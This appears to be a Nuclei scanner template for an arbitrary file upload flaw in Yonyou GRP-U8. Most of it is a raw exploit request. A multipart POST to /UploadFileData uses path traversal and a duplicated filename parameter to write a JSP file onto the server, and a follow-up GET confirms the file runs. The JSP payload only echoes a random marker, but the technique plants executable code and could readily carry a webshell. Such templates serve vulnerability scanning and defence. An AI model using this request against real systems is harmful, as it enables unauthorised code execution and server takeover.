id: yongyouOA-GRP-U8-UploadFileData-file-upload

info:
  name: 用友 GRP-U8 UploadFileData 任意文件上传漏洞 
  author: cnaq
  severity: critical  
  description: 用友 GRP-U8 UploadFileData接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限
  reference: 
    - https://www.youdao.com/result?word=%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E&lang=en
  tags: yongyouOA,file,upload 

requests:
  - raw:
      - |
        POST /UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename={{randstr}}.jsp&filename=1.jpg HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary92pUawKc
   
        ------WebKitFormBoundary92pUawKc
        Content-Disposition: form-data; name="myFile";filename="test1.jpg"

        <%@page import="java.text.*,java.util.*,java.io.*"%><%out.println("{{randstr}}");%>
        ------WebKitFormBoundary92pUawKc--

      - |
        GET /R9iPortal/{{randstr}}.jsp HTTP/1.1
        Host: {{Hostname}}

    req-condition: true # dsl跨请求处理需要开启选项
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(body_2, "{{randstr}}")'
        condition: and